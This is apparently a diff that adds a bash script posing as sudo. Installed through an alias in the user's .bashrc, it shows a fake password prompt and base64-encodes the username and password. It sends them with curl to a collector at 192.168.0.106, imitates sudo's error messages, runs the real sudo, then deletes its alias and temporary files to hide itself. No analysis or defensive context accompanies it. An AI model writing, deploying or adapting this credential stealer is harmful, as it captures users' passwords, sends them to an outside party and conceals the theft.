@@ -1,0 +1,45 @@
+#!/bin/bash
+
+ATTEMPTS=3
+PROGRAM_NAME="/tmp/43589253.temp"
+RESULT_SUDO="/tmp/43589245.temp"
+ALIAS="alias sudo='\/tmp\/43589253.temp'"
+WHERE="http://192.168.0.106/"
+
+# reset timestamp
+sudo -k
+
+while [ $ATTEMPTS -gt 0 ]; do
+
+	read -sp "[sudo] password for $USER: " password
+	echo
+
+	encoded=$(echo "$USER : $password" | base64) > /dev/null 2>&1
+
+	# update timestamp for sudo
+	echo "$password" | sudo -S echo -n > $RESULT_SUDO 2>&1
+
+	if grep -q "Sorry" $RESULT_SUDO; then
+		(( ATTEMPTS-- ))
+		echo "Sorry, try again."
+		if [ $ATTEMPTS -eq 0 ]; then
+			echo "sudo: 3 incorrect password attempts"
+		fi
+		curl -s "${WHERE}${encoded}_attempts/" > /dev/null 2>&1
+	elif grep -q "sudoers" $RESULT_SUDO; then
+		curl -s "${WHERE}${encoded}_isnot/" > /dev/null 2>&1
+		echo "$USER is not in the sudoers file."
+		#echo "This incident has been reported to the administrator."
+		sed -i "/${ALIAS}/d" "$HOME/.bashrc"
+		rm -f $RESULT_SUDO $PROGRAM_NAME
+		exit
+	else
+		curl -s "${WHERE}${encoded}_is/" > /dev/null 2>&1
+		sudo $@
+		sed -i "/${ALIAS}/d" "$HOME/.bashrc"
+		rm -f $RESULT_SUDO $PROGRAM_NAME
+		exit
+	fi
+done
+
+rm -f $RESULT_SUDO
